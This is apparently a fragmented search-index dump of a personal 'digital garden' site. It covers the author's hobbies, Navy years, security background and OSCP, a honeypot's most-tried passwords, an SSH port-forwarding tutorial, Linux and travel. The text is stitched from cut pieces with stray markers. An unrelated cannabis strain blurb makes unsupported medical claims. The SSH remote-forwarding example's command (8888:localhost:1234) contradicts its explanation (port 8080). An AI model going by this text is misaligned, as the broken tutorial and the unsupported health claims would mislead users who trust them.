I wanted a blog, a wiki, a journal, and a little eye candy but none of the technologies I knew could do it. After various failed attempts with quite a few options, it occurred to me that the answer might not be a single technology, but a \"network\" of ideas (seeds) and technologies (plants) within a single domain (garden).</p> <p>While looking for some technical information I stumbled across Nikita Voloboev's site and then The Blue Book. I realized this is exactly what I wanted and there was a name for it! The more I poked around the more excited I got about the technology that built it. I was already well on my way with a previous website running on Jekyll and GitHub Pages but I just couldn't figure out how to get the notes aspect incorporated.  I did give Gitbook a try previously, but didn't consider using them together, rather than one or the other.</p> <p>Yes, I know this isn't new technology, but parts of it are new to me. More about the technology below.</p> <p>What's a \"digital garden\" exactly?</p> <p>First, let's think about what an actual garden is. Generally, gardens have these qualities:</p> <ul> <li>It's usually a place things grow</li> <li>A garden is never really \"done\"</li> <li>Weeds can take over if left unattended (See the enormous gap in my blog posts)</li> <li>A garden can be very personal and private or shared with the public</li> <li>They require attention and love</li> <li>It can be a great place for reflection and contemplation</li> <li>There is no right or wrong way to do it</li> </ul> <p>This last part is the key. I am doing this for me and I can do it any way I like. Pretty clich\u00e9, but I feel like it can truly be anything I want it to be, my imagination is the only limiting factor.</p> <p>Do you see how this can all be applied to the digital world? Basically what I'm saying is, that this isn't a blog or wiki or website, it's all of them (or none of them?). This is a place to grow ideas and share information, as well as leaving a legacy for future generations. </p> <p>I'm not totally sold on GitBook, mostly because I want to be able to use footnotes (why not?) and I can't do that here. All of the other beautiful gardens I have come across were put together by folks that know what they are doing. For now, this is how we're going to roll. Not too easy on the eyes, but functional and low overhead. I guess that'll do for now.</p> <p>Who knew how important the technology would be? I spent quite a bit of time trying out different ways to create my garden in the way I wanted it to look.  It turns out, it's like most other things in life, there is always a different way to do it.  But I still struggled to make it what I envisioned. After searching for a way to make my Gitbook not look like crap, I came back to The Blue Book. Not only did I like it, there are instructions and words of encouragement on how to get it all set up!  </p> <p>So, after a week on Gitbook, this is the new and improved look. As I'm quickly finding, this will always be a work in progress.  I'm looking forward to keeping it up.  I have a habit of changing hobbies often and I'm hoping this one sticks.</p> <p>Keep in mind this is my brain (and opinion), exposed for anyone to explore. Be gentle.</p> <p>Well, this is it, this is my digital garden. Who would've thought I'd be a gardener one day?</p> <p>2022-08-13: I came across this article and it hit pretty close to home.  There is no better reason to leave a legacy behind.  This really is everything I know about everything I know.</p> <p>Stats? Nevermind.</p>"},{"location":"about/","title":"About","text":"<p>This page is a deeper dive into who my intended audience is. It's probably not very clear who this is for and that seems to vary from day to day.  Sometimes I want to have a big following and get feedback, whether it's upvotes or comments, or something similar.  However, I always want it to be for me.  I want this garden to be my operating manual for when I am either unable to remember something or when I am awakened after some kind of reboot.1</p> <p>I have a lot to say and nowhere to say it. Facebook steals your data and does terrible things with it. I went so far as to completely delete my account from Facebook back in 2017. I\u2019m not a fan of Insta, Twitter, Snapchat, or pretty much any other social media. Reddit is my go-to for many things these days, but it\u2019s not the appropriate place for a blog and I\u2019m too lazy to have multiple accounts to keep things more anonymous there.</p> <p>So here we are. Just a blank slate with plenty of space and lots of things I want to say. No \u201cfriends\u201d, likes, dislikes, or funny captions.2 I might never allow comments, and I haven't decided who I will share this site's connection with me.  Maybe I'll keep it completely anonymous, but for now, it is what it is.</p> <p>UPDATED: 2022-06-19.  I've decided for this to be live I need to start checking in updates instead of waiting for everything to be \"just right\".  This is for two reasons, firstly of all, it's always going to be a work in progress and secondly I'll have a change log of all the updates I've made.  It'll also make it easier to see the history of each file.  I know I can do it locally, but I feel like if I'm going to commit to this whole developing in public3.</p> <p>Disclaimer: This site is intended for the use of the individual addressee(s) named above and may contain information that is confidential, privileged, or unsuitable for overly sensitive persons with low self-esteem, no sense of humor, or irrational religious/political beliefs.

Trust me, it's easier this way, it's also more fun.6</p> Q28. Why is was the nav bar not in alphabetical order? <p>I have no idea.  I am pretty rigid when it comes to things like this, and I spent a good couple hours trying to figure out why it won't put things in alphabetical order and finally gave up for now.  It's definitely an mkdocs thing.  I'm trying to embrace being less rigid, though and this is going to be one of those times where I am going to stop fighting it and see where it goes.  Does it really need to be a meticulously trimmed garden or can it wander?  For now I'm going to consider it a vine that grows in my garden and sometimes it will grow to the directions it wants.</p> <p>Update 2022-08-13: I figured it out, the issue is that mkdocs goes by filename and not description or title of the post.  So even if my post is called \"foo\", if I name the file \"zebra.md\", it will show up at the bottom alphabetically.  While I was ok with it being weird and did finally accept it, I'm happy I figured it out.  I'm still going to fix it :)</p> <p>Update 2022-10-30: Done!</p> 34.

This dank bud boasts an average THC level ranging from 22-26% and a myriad of surprisingly well-balanced indica and sativa effects. Users describe the Strawberry Banana high as one that starts with a mild head buzz and then slowly builds into an intense euphoric and uplifted cerebral head high, leaving you relaxed and focused. This is accompanied by full-body relief and a warming body buzz that leaves you slightly sedated and couch-locked with a moderate case of the munchies. Due to these potent effects, Strawberry Banana is an ideal strain for treating patients suffering from conditions such as chronic pain, stress, depression, and appetite loss. Strawberry Banana has a memorable aroma of sweet tropical strawberry and a taste of tropical strawberry with a sweet banana exhale. Sweet Banana buds have oversized fluffy popcorn-shaped bright neon green nugs that are spattered with long and twisty dark orange hairs.

You look on the website for geocaches in your area and then go to the coordinates provided.1  Once you get to a specified location, you must locate something hidden there.  </p> <p>I really got into it after seeing it on a travel show that was hosted just down the road from me!  My son was around 7 or 8 years old when we went \"treasure hunting\".  We hiked and traveled around all over the world finding geocaches in places we would have never seen if it wasn't geocaching.  </p> <p>If you are searching for a \u201ctraditional\u201d cache, it needs to be only large enough to hold a piece of paper for you to sign to prove you found it.  This means it can be as small as a thimble or as large as a 5-gallon drum.  Once you find it, you sign the log and return the cache exactly as you found it.  </p> <p>In the early days of the game, you needed a handheld GPS device and access to the Geocaching website.  Eventually, cell phone technology would improve and no longer be dependent on other electronic devices like a handheld GPS.  This was a game-changer, especially for more urban cachers, because getting caches and waypoints onto a handheld GPS was painful at best.</p> <p>I would get a \u201cpocket query\u201d which provides a filtered list of the caches I was interested in finding and hit the road.  Like most things in life, the best thing about it was almost always the journey.  One of the requirements for placing a geocache is that you must be able to \u201cmaintain\u201d it.2  This meant the locations were hand-picked by the person placing the cache.  Even in urban settings a lot of caches were at locations of interest, such as a fountain or statue.</p> <p>The great thing was, that anyone could do it.  Every geocache has a terrain and difficulty rating so you can choose to make it as easy or difficult as desired.  The terrain was anything from wheelchair accessible to requiring \u201cspecial\u201d equipment.  For example, there are caches you can only reach by diving or climbing mountains.  Difficulty was based on how difficult it is to find the cache when you arrived on the scene.  </p> <p>Sounds great, why don\u2019t you still do it?  There are a few reasons I stopped.  </p> <p>The biggest reason I stopped is that sometimes the geocache isn\u2019t at the specified location.  Keep in mind this game requires other people to \u201cdo the right thing\u201c.  This means replacing things as you find them or playing in a way that is fair to other players.  There is no guarantee you will find what you are looking for when you get there and as I found more and more caches, I would have to travel further and further away to find new ones.  While the journey can be an adventure all on it's own, it's still disappointing taking a long trip somewhere, searching for a long time, and finding out that it\u2019s there for some reason.</p> <p>Another reason I lost interest in geocaching was how corporate it has become.  When it started, the point was to get out and have grand adventures. You didn't need anything but free access to the website.  Slowly everything was being put behind the paywall.  In doing some reasearch for this page I noticed you can't even view YOUR OWN logs from caches that have now been archived.  </p> <p>I was a pretty active Geocacher starting in Mar 2005.  After 2011 I started to cache less and less until my last find in 2016. I finished with 3,624 finds and a LOT of great memories.</p>"},{"location":"hobbies/geocaching/#handy-tools-of-the-trade","title":"Handy tools of the trade","text":"<p>Although terrain can differ, there are definitely things a geocacher should have in their bag of tricks.</p> <ul> <li>First aid kit</li> <li>Tweezers</li> <li>Gloves</li> <li>Mechanic mirror </li> <li>A handful of pens and pencils</li> <li>Safety pin</li> <li>Flashlight</li> <li>UV Flashlight</li> <li>Replacement logs of various sizes</li> <li>Poison Ivy/Oak lotion</li> <li>Bug repellent </li> </ul>"},{"location":"hobbies/geocaching/#favorite-caches","title":"Favorite caches","text":"<p>I intended to list some of my favorite finds but since I can't view any of my previous logs thanks to Groundspeak's greediness, I guess this will be a list of a few of my VERY favorites.

I really enjoy Ingress because it\u2019s all of the things I like about geocaching such as finding new places and getting outside, but without the downsides like spending an hour searching for something that wasn\u2019t there.  Ingress is also similar to geocaching, where you can go solo or with other people and, it\u2019s location-based.  But that is where the similarities end.</p> <p>Getting started is pretty easy, you need to get the app for your phone, pick a team, and off you go.  The whole game is based on using your scanner1 to go portals2 that have been approved by the community.  However, there is a web/desktop site with a map of the current state of the game, along with other game-related things and of course, a store.  The game is free to play, but you can still buy the additional inventory to use in-game.  </p> <p>There is a story that goes with the game, although you don\u2019t need to follow any of it to play8.  Once you have the game installed, it will show you where the portals are that are closest to you.  To see portals in a specific area you have to check the map on the Niantic site.  The goal is to link portals together to form fields3 and the score is tallied every 5 hours, the team with the most points wins that cycle.   </p> <p>Another interesting aspect of the game is you get points based on MU, which the amount of population within the confines of the field4.  A large field between California and Hawaii is not worth as many points as a smaller field over a major metropolitan area.  The tricky part is that links between portals may not cross, this is where teamwork comes into play. In most cases, the larger the links and amount of MU, the more people it may take to connect those links.  Imagine trying to connect links across a state or even a country!</p> <p>To link portals together, you have to physically visit that location, and once there, find or capture7 a portal so it is owned by your team.

I had never seen a computer, but as soon as I saw it in action I knew this would be my new obsession.3 Thanks to a huge influx of cash[^4] I was able to purchase my own computer, a Commodore 128[^4]. As I played more games and even got some exposure to programming.  Luckily my friend's dad was into computers more than just for his job, so he showed us how they really worked.7</p> <p>[TODO]: Make this whole HAM/computer section it's own page.  All these footnotes should have their own place.</p> <p>I didn't take the traditional high school, then college route.  By the time I graduated high school (with a C average), I decided I didn\u2019t want to go back to school for another four years.  Also, I come from a history of Navy men in my family, so it seemed almost natural that would be the next step.  Before I even finished high school, I joined the Delayed Entry Program and left for boot camp about a month after I graduated high school at the age of 17.  I was ready to go see the world and see what big adventures awaited me.</p> <p>Not only did I need my parents to co-sign for me because I wasn\u2019t 18, I almost wasn\u2019t allowed to join the Navy for two other reasons.  The first time came before I even left my hometown. I joined while I was still a senior in high school and then shortly after went on my senior trip with my high school\u2026 to Russia. As it turns out, visiting a Communist country while the US government is trying to do a background check for a top secret clearance isn\u2019t wise.  I had to provide a day-by-day description of where I was, who I was with, and everything I did for the entire trip and then had to break off communications with anyone I met.</p> <p>The second time I almost wasn\u2019t able to join, I was at MEPS, the place where you get a physical before you are allowed to join.  It would seem that I inherited the flat feet of my clan because when I went to be processed I was told I had severe flat feet and it could cause knee problems later down the road.  The doctor that examined me sent me to another part of the station to be further examined and get a second opinion.  Nobody ever came and after a while, I decided I had waited long enough and left to join the rest of my group in the next step.  So far, my back is worse than my knees, although my feet are still very flat.</p>"},{"location":"life/In-the-navy/#in-the-navy","title":"In the Navy","text":"<p>In typical recruiter fashion, I was bamboozled by my recruiter and ended up in a branch of the Navy that wasn\u2019t allowed to travel outside of my home port for more than 90 days at a time without explicit permission from TPTB (I don\u2019t remember who exactly needed to approve, probably some Admiral somewhere).  Even though I joined the Navy to see the world, I really didn\u2019t leave the West Coast of the US except for a few visits to Hawaii.  </p> <p>Coming from the East Coast, California was a big change and while I was initially disappointed about not being able to travel overseas, it turned out to work in my favor when I was getting serious with my girlfriend (who later became my wife).  I had also seen other people in the Navy miss their children growing up while they were on a six-month deployment and I didn\u2019t want that to happen to me.</p> <p>After boot camp and A school2, and after specifically requesting a duty station on the East Coast, I got a bus ticket to my first duty station, the USS Bolster (ARS-38) in Long Beach, California.  It had a crew of about one hundred and was a very small, tight-knit family.  It definitely spoiled me because I had no idea what I was in for when my next duty station was the USS Lewis B Puller (FFG-23).  It is almost twice as long and had twice as many crew.  I learned I definitely like the smaller ships, I couldn\u2019t imagine being on a HUGE ship like a carrier.</p> <p>I ended up serving aboard two ships and two shore commands.

Especially trying to leave work at work to try and maintain that live/work balance.  Lately, I've been getting into yoga and meditation.  I'm good at neither yet but have been having a great time trying.  I'm very blessed to have a backyard oasis to relax in, where I can contemplate the answer to life, the universe, and everything.1</p> <p>One of the things I often contemplate is, is what I'm doing \"something\"?  One of my worries is feeling judged for being lazy and not doing anything.  Pretty sure that comes from being in the Navy for 8 years, where you were always doing \"something\".  Whether it's sleeping, working, or cleaning something, usually you were generally busy.  </p> <p>Now that I'm older and wiser, I'm learning that it's OK to do \"nothing\".  In fact, it seems to do nothing is actually doing something.  People pay to travel and stay places where they can sit around on a beach, or a secluded little bungalow with a garden, or maybe a deck with a BBQ.  Basically, people are paying to go somewhere and do nothing.  So then doing nothing is something if you are not local?  I guess it really depends on how you look at it.  </p> <p>I've come to find that relaxing and staring out into space or closing my eyes and listening to a bubbly fountain is not only calming and centering, but it also helps me just think.  Cannabis magnifies this mindset and has led to a state of euphoria that has brought me to some really interesting thoughts, ideas, and in some cases very strong memories that seem to come from the deepest recesses of my brain.</p> <p>What I'm saying is, it's really OK to just sit and do nothing.  In fact, this is what I aspire to be; I want to be able to do nothing anytime I feel like it.  I came to this conclusion while doing \"nothing\".</p> <ol> <li> <p>I know it's 42.

It's always sad to see one of them go.  Recently, we had to put one of them down.  She was 17 years old and lived a very happy life.  She was the most cat-like cat I've ever owned.  She was skittish around people, napped a lot during the day by herself in the sun, and was full of energy and playful in the evenings.</p> <p>Everyone who has ever owned a pet knows that even though the love may be shared around a family, the pet usually has someone who they have a special bond with.  This one happened to be mine.  She sat only in my lap, would listen paid attention to only me, was really only interested in hanging out with me and was really.. well.. mine.  </p> <p>She was not very smart, though.  She was the one that played with all the toys, chased all the things, jumped on top of all the things and ran around the house in circles bumping into things along the way.  She always fell for the fake food sounds when we needed to get her somewhere.</p> <p>The other remaining cat loves to be outside and has no interest in running off, so she spends a lot of time outside in the yard with us.  Unfortunately, this kitty was always a flight risk.  She is easily spooked and we were always worried to let her outside at all for fear she would run off and not be able to figure out how to get back.  The few times she did sneak out onto the back deck, she would end up underneath it and we'd have to coax her out.  Because of this, she didn\u2019t like the backyard and so it didn\u2019t seem appropriate to commemorate her there.</p> <p>Most of all, she was the inspiration for the name of my garden.  One evening I was working in my office towards the end of her life, and she came for my attention. I was able to lift her with one hand at this point and as I picked her up, the name just came to me.</p> <p>Every time I contemplate the name of my garden, it now has even more of a special meaning.</p>"},{"location":"life/whats-identity/","title":"What is an identity?","text":"<p>An identity is how to identify yourself.

There is a lot of call and response, a lot of cowbell, and a lot of dancing!</p> <p>Since I left the DC area when I was a teen,1 some of the information here is memories, music I have, and research around the web.  Wikipedia has a much different explanation of go-go and mentions a lot of bands that I'm either vaguely familiar with or just hadn't heard at all.  While I agree Chuck Brown is known as \"The Godfather of Go-Go\", go-go is a musical movement that cannot be traced back to one single person.  The rest of the article is odd that it mentions big concert venues and songs making an impact on the music charts when that wasn't my experience at all.</p> <p>When I lived in the DC area growing up there were a few big shows2, the best you had was going to live parties or very small venues where the only way to get a recording of the music was a live \"PA\" tape.3  During DC's initial surge, the Department of Parks and Recreation even drove bands around in \u201cShowmobiles,\u201d allowing groups to perform free go-go concerts in multiple neighborhoods during the summer months.4</p> <p>There is really no way to accurately describe the sound of go-go music, so the best thing to do is just listen for yourself.  Here are few of my favorite songs that I found on YouTube.  </p> <ul> <li>Take Me Out to See Junkyard - The iconic \"Hee-Haw Song\" by Junkyard Band</li> <li>Physical Wunders 1996 - Another of my fav bands</li> <li>Junkyard Band - Live and direct - Gives you an idea what live shows were like in a venue</li> <li>ChillyWillie and High Performance Band Live is a good example of a typical show and distinct sound</li> <li>Northeast Groovers - (NSFW language) - One of my fav Go-Go bands</li> </ul> <ol> <li> <p>A long time ago.

The answer is simple; People haven\u2019t changed their security hygiene. </p> <p>First, let\u2019s talk about what the rockyou wordlist is and why it is still in use.  In December 2009, a social app company named RockYou had threat actors breach their security and steal 32 million user accounts including usernames and passwords stored in plain text.

We know they use this list of passwords to attempt to break into other user\u2019s accounts.  So why are we still using those SAME PASSWORDS?</p> <p>Not only are people using easy to guess passwords, but companies that make devices people rely on, things like firewalls, web cams, routers, etc. STILL ship products with the same default password to consumers who are either too lazy, or don\u2019t know that they should change the default password from \u201c123456\u201d.</p>"},{"location":"tech/musings/about_passwords/#breakdown","title":"Breakdown","text":"<p>Here are the top 10 password attempts the honeypot that I was running in a DO droplet:</p> <pre><code>nproc\n123456\npassword\n123\nadmin\ntest\nroot\npassword123\ntest123\nP@ssw0rd\n</code></pre> <p>Why does this matter?

Many years ago, in a previous life, I was really into computer (in)security.  A friend of mine helped me with my first Slackware install and despite that I still enjoyed it.  I got into going to 2600 meetings, regularly went to DEFCON and was totally hooked.  This is it for me, this is what I want to be when I grow up.</p> <p>As time went on I found myself with a sysadmin gig where working in security seemed like it would be pretty boring.  This was at a time where companies were just understanding the web wasn't a safe and trusting place.  Ideas like risk management and acceptable use policies were what people worked on.  Many companies didn't appreciate they would need pen testers to help protect them.</p> <p>Fast forward to the year 2020.  People now get paid insane amounts of money for \"hacking\".  There are people that look for vulnerabilities in code and/or networks and even certifications to show one has the ability to do it (or at least took a class on it).  Not only can you get paid to be a hacker, but also many of those jobs let you work from anywhere on the planet.  What I've found most surprising is all of the tools and the resources that are just a few keystrokes away.</p> <p>A family friend turned me on to the OverTheWire site that gives you challenges that call for various computer skills.  From the site, you start out with a basic login for a host that contains the puzzles.  Moving forward, you get the account for the next level by solving the puzzle on the current level.  Each puzzle gets increasingly more difficult starting with just being able to log in and higher levels include things like setting up public/private keys for ssh finding local exploits and privilege escalation.  </p> <p>Later, I came across Hack The Box that was even more advanced.  Once you manage to get an invite (by solving a short challenge) they provide you with VPN access to their entire network that contains a number of vulnerable hosts for you to hone your pentesting skills.  It's extremely organized and well designed with a leaderboard.  Best of all, it's free!  </p> <p>Both sites are completely free.  I couldn't imagine having these resources when I was growing up.

Everyone was about spreading information, transparency, and people were excited to share everything.</p> <p>Things were going great. There was sharing and getting anything they could get their hands on digitized! Keep in mind, the Internet is a new place and that data isn\u2019t going to get there on it\u2019s own.

Well, there is also a note on the Security hacker entry that says \"Not to be confused with Hacker or Hacker culture\".  If you follow the first link you will find all of the same information spun a different way, with slightly different names.  I guess everyone really does have their own definition of what a hacker is.  </p> <p>One of my favorite tshirts has this definition of \"hack\" on the back:</p> <p>hack (h\u0103k)</p> <ol> <li>A clever, non-obvious solution to an interesting problem.</li> <li>An appropriate application of ingenuity to creatively overcome an obstacle or a limitation.</li> <li>The technical equivalent of chewing gum and duct tape.</li> </ol> <p>In the end, I believe a \"hacker\" is more broad of a term.  As in, someone that has above average skills, usually with technology.  Whether it is phones, computers, or other hardware or software.  Sure, anyone can operate an iPhone.  But can you jailbreak it, and customize it with your own look and feel?  I would consider those skills above and beyond and therefore, a hacker.  </p> <ol> <li> <p>April 2022.\u00a0\u21a9</p> </li> <li> <p>\"White hat\" vs \"black hat\".  I think the distinction between white hat and black hat is a little cringey and in most circles, considered media jargon.  In my opinion, these days the difference really comes down to a paycheck and motive.  Sure, there is some overlap with people that are hired for nefarious purposes, but in many cases the dream is to get a job that pays good money, especially those that allow working remotely.3 Bug bounties4 are also a good way to practice and earn some money.\u00a0\u21a9</p> </li> <li> <p>There is currently a huge contraversy in Silicon Valley about employees having to return to the office after managing just fine for two years.\u00a0\u21a9</p> </li> <li> <p>TODO: Bug bounty explantation.\u00a0\u21a9</p> </li> </ol>"},{"location":"tech/security/","title":"Security README","text":"<p>Back in August of 2020, I earned an OSCP (Offensive Security Certified Professionl) certification.  This means I completed a course to learn that I can (in some cases) hack1 other servers in a controlled environment.  Offensive Security is the company that offers certifications for various level of difficulty, but OSCP is the golden standard for getting your foot in the door to the cyber security field.  The certification process is pretty vigorous, at a super high level:</p> <ol> <li>Pay money to a company, Offensive Security</li> <li>They give you study materials, access to the private practice labs, and 1 exam </li> <li>Study, Study, Study and bonus points for actually completing all the materials2</li> <li>Take 24 hour long, proctored exam where you have to exploit 5 vulnerable servers</li> <li>The following 24 hours are for completing the report, complete with screenshots</li> <li>Submit the exam and wait for the results </li> </ol> <p>I got it mostly for fun, as cyber security (and lack thereof) has always been a passion of mine.  In fact, I had big dreams of one day doing it for a living.  But first let\u2019s go back..</p> <p>The year was 1998, I was in the US Navy and was living in San Diego, CA.  My friend, who was also in the Navy (and later went to [Captian\u2019s Mast]https://en.wikipedia.org/wiki/Non-judicial_punishment#Mast) for intercepting his Commanding Officer\u2019s email), got me hooked.  We spent every chance we had to geek out.  Whether it was learning Linux, looking for hardware for \u201cthe next big thing\", or attending 2600 meetings and DEFCON.</p> <p>Fast forward to when security was just becoming a thing.3  There were exactly two other people in the large company I worked for that were responsible for security.  One of whom I knew fairly well. He often explained how security was \u201cboring\u201d and what his day-to-day work was like.  That guy is a CISO somewhere now.  </p> <p>Despite what I knew and coming from another company where I was almost solely responsible for their security, I feel like this was pivotal to my moving away from the unknown(?) InfoSec path to the more comfortable path of making a sysadmin my career, especially at a time of having a family to support.</p> <p>About 15 years later, my teenage son and his friends were taking high school and college-level computer science classes and they gave me the bug again. It's almost unbelievable how the wealth of information and tools had come such a LONG way in the last 15 years!</p> <p>[TODO]: Something in here should explain why I care about putting all this info out here on the Internet.  After all, it's not very good OPSEC.  Who knows? One day it might make me take everything down completely again.  Maybe it just stays annonymous?</p> <p>This pretty much sums up my security background.  </p> <ol> <li> <p>TODO: What is \"hacking\" exactly?\u00a0\u21a9</p> </li> <li> <p>A series of TERRIBLE videos, and 1000'ish page book\u00a0\u21a9</p> </li> <li> <p>Somewhat relevant history of the internet \u21a9</p> </li> </ol>"},{"location":"tech/security/binary-exploitation/","title":"Binary Exploitation (a *very* brief overview)","text":""},{"location":"tech/security/binary-exploitation/#binary-exploitation","title":"Binary Exploitation","text":"<p>During my studies to become OSCP certified I studied quite a bit but never delved too far into binary exploitation.

It's not often enough to keep committed to memory and I figured this might help other people as well.  So let's look at some examples of local port forwarding and remote port forwarding as well as why we would need them.</p> <p>If you are in a hurry and just need something to jog your memory:</p> <p><code>ssh -L local_port:remote_address:remote_port username@remote_server.com</code> &lt;- Local</p> <p><code>ssh -R remote_port:local_address:local_port username@remote_server.com</code> &lt;- Remote</p>"},{"location":"tech/security/ssh/#local-port-forwarding","title":"Local Port Forwarding","text":"<p>\u201cLocal port forwarding\u201d allows you to access resources that aren\u2019t exposed to the Internet (or other networks). For example, if you want to access a web server at your office from your home and for security reasons, that server is only configured to accept connections from the local office network. If you have access to an SSH server at the office, and that SSH server allows connections from outside the office network, then you can connect to that SSH server from home and access the web server as if you were sitting in the office.</p> <p>To use local port forwarding, connect to the SSH server normally, but also supply the -L argument. The syntax is:</p> <p><code>ssh -L local_port:remote_address:remote_port username@server.com</code></p> <p>If you're still following along with the example, assume the following is true: * The web server at your office is located at 192.168.1.111 on port 8080. * You have access to the office\u2019s SSH server at ssh.youroffice.com. * Your user account on the SSH server is \"bob\".</p> <p>In that case, your command would look like this:</p> <p><code>ssh -L 8080:192.168.1.111:8080 bob@ssh.youroffice.com</code></p> <p>At this point, you\u2019d be able to access the webserver on port 8080 at localhost. You could just plug in http://localhost:8080 to your web browser and browse the web server as if you were in the office.  All traffic sent to port 8080 on your host will be tunneled to 192.168.1.111:8080 on your office network.  Pretty handy for working at home!</p>"},{"location":"tech/security/ssh/#remote-port-forwarding","title":"Remote Port Forwarding","text":"<p>\u201cRemote port forwarding\u201d is the opposite of local forwarding, and isn\u2019t used as often. It allows you to make a resource on your local host available to a remote host. For example, let's say you\u2019re running a web server on the local PC you\u2019re sitting in front of. But your host is behind a firewall that doesn\u2019t allow incoming traffic.</p> <p>To use remote forwarding, use the ssh command with the -R argument. The syntax is largely the same as with local forwarding.  Note the LOCAL address of your host is used this time:</p> <p><code>ssh -R remote_port:local_address:local_port username@server.com</code></p> <p>Now we assume the following:  </p> <ul> <li>Your web application listening on port 8080 on your local host.</li> <li>The SSH server at your office is ssh.youroffice.com.</li> <li>Your user account on the SSH server is bob.</li> </ul> <p>You\u2019d run the following command:</p> <p><code>ssh -R 8888:localhost:1234 bob@ssh.youroffice.com</code></p> <p>Someone could then connect to the SSH server at port 8080 and that connection would be tunneled to the server application running on port 8080 on the local host you established the connection from.</p> <p>Hopefully, this is useful for remembering the difference between local and remote port forwarding!</p>"},{"location":"tech/security/ssh2fa/","title":"2FA SSH with Google Authenticator","text":"<p>Recently I set up a new VPS with DigitalOcean and it felt a bit exposed so I made a few tweaks to harden my droplet.

I started thinking about the first Linux box I set up many years ago.  I knew nothing about Linux and my good friend said if I wanted to learn, I need to start with Slackware.  I remember loading Slackware with XFCE from a set of 3.5\" disks2 and what a chore it was.  I spent days installing the OS, compiling all the apps I needed, and even learning how to compile my own kernel. </p> <p>The interesting part about choosing a Linux distro is that you don\u2019t have to change the OS to change the desktop environment (DE)3 and the window manager (WM)4 which will give the OS a completely different look and feel without having to install a different distro.  Many people new to Linux have a hard time grasping this idea since most people are generally used to MacOS or Windows where you have no choice.  Not only can you pick which one you want to use for Linux, but you can also install multiple DEs side by side and try different ones before you commit.  </p> <p>Here are some DEs I really like:</p> <ul> <li>XFCE</li> <li>KDE</li> <li>Cinnamon</li> <li>Gnome</li> </ul> <p>Here are some WMs I like:</p> <ul> <li>Enlightenment</li> <li>WIndowMaker </li> <li>Compiz</li> <li>fvwm2</li> </ul> <p>The best thing about Linux is even though you pick a DE and WM, you can still customize almost everything regarding look and feel.  It really depends on how much you want to tinker and how much time you have to fall down a deep rabbit hole.</p> <p>Mostly, these days I just use a Mac as it just does what I need it to do without much tinkering.  When I\u2019m in the mood to tinker or if I\u2019m doing something that requires Linux I pretty much just run it in a VM.  The two distros I mostly use are Mint with Cinnamon DE as my daily driver and Kali with XFCE for security-related projects.</p> <p>I guess the tl;dr is the right distro for someone is really what they are comfortable with.  IMO, the big difference between distros is the package manager.5 So, the answer really is go with what you know for a daily driver.

I joined the Navy to \"see the world\" and while I didn't travel quite as much as I hoped, it was a huge change from growing up in the 'burbs. It came in handy when I met the love of my life and I wasn't out to sea on 6 month long deployments.  Plus, I did get to see much more than I might have had I not joined the Navy.  As I've gotten older, I've been lucky enough to have a steady career that allows me to take time off to rejuvenate and travel with my family.</p> <p>Now, I try to take advantage of any opportunity or excuse to travel somewhere or at the very least take a road trip.  When I first met my wife, we lived in a shitty little apartment with shitty roommates and so we were home as little as possible.  Sometimes we would just jump in the car, pick a direction and go.  We would drive until we felt like we were \"there\".</p> <p>The last two years of Covid made traveling difficult.  Because of lockdowns, Covid variants, and so much of the country in disarray from fires, flooding, tornadoes the effects of the last two years made it that even if we weren't afraid of dying of Covid and didn't care about a very real possibility of World War III, a lot of things are either not fully staffed, or just not operating at 100%.</p> <p>We took a (very) few trips during the first two years of the pandemic and the time between 1/22 and 5/22 included pretty much zero travel farther than random trips down the coast.  I\u2019m READY to GTFO!</p> <p>Hopefully, this area of my garden will grow the fastest! :)</p>"},{"location":"travel/bucket-list/","title":"Bucket List","text":"<p>I don't really have a \"bucket list\" because there are so many things to see and so little time.

I've tried to personalize this a bit by adding my own comments and feelings I associate with these quotes. </p> <ul> <li>\"If the road you travel has no obstacles, it leads nowhere.\" -Frank A. Clark</li> </ul> <p>This is true.  While people always hope for a trip without problems or obstacles, those are the ones that are most memorable.  Just remember (in most cases) obstacles generally result in the best stories.</p> <ul> <li>\u201cYou have brains in your head. Feet in your shoes. You can steer yourself any direction you choose. You\u2019re on your own. And you know what you know. And YOU are the one who\u2019ll decide where to go\u2026\u201d \u2013 Dr. Seuss</li> </ul> <p>I love the feeling of being in a new place and exploring all the new wonders. The only thing stopping me is me.</p> <ul> <li>\u201cTraveling \u2013 it leaves you speechless, then turns you into a storyteller.\u201d \u2013 Ibn Battuta</li> </ul> <p>This is how I hope every trip goes.  There is so much beauty to see and the only thing better than seeing it is sharing it with other people.  </p> <ul> <li>\"There is no bad weather, only inappropriate clothing.\" - Alfred Wainwright</li> </ul> <p>These are words I\u2019m trying to embrace more and more.  If you dress for the environment you intend to be in, the weather shouldn\u2019t be an issue.  I have been inside ice caves in Iceland and searing heat in Death Valley, California, but because I was completely prepared, I had a great time.</p> <ul> <li>\u201cThe world is a book, and those who do not travel read only one page.\u201d \u2013 Saint Augustine</li> </ul> <p>I have encountered people that never left their hometowns despite being 30 minutes to the country\u2019s borders.  I once met someone who couldn\u2019t understand why I would be interested in traveling in the first place and I just couldn\u2019t wrap my brain around that.  Who wouldn\u2019t want to see the rest of the world? </p> <ul> <li>\u201cBetter to see something once than hear about it a thousand times.\u201d \u2013 Asian Proverb</li> </ul> <p>I never fully understood this until I visited the Colosseum in Rome.  We stayed at a hotel right nearby, however, we didn\u2019t know how nearby.  After dropping our things off at the hotel, we went for a walk to find dinner.  Just wandering around without any direction, we turned a corner and unexpectedly saw the Colosseum in all it\u2019s beauty.  I will forever remember that feeling and how photos just don't do it justice. </p> <ul> <li>\"Fair winds and following seas.\" - Unknown[^1]</li> </ul> <p>This is a very popular military travel quote and coming from a Navy background, it hits very close to home.
